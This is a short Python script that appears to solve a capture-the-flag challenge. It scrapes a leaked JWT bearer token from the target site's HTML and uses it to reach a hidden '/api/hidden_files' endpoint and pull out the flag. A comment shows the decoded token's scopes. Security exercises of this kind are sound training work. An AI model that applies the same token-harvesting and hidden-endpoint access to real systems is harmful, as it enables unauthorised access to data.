import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import re

BASE_URL = "https://maymays.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    # {"alg":"HS256","typ":"JWT"}{"sub":"24493501-71eb-4ead-a626-b57034fa0109","name":"Maymays Site","iat":1516239022,"scopes":["memes","flag"],"allowed_endpoints":["/api","/api/memes","/api/hidden_files"]}
    def get_authorization_header(self):
        response = self.session.get(BASE_URL)
        match = re.search(r'Authorization:\s*"([^"]+)"', response.text)
        return match.group(1)

    def main(self):
        response = self.session.get(f"{BASE_URL}/api/hidden_files", headers={
            "Authorization": self.get_authorization_header()
        })

        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()
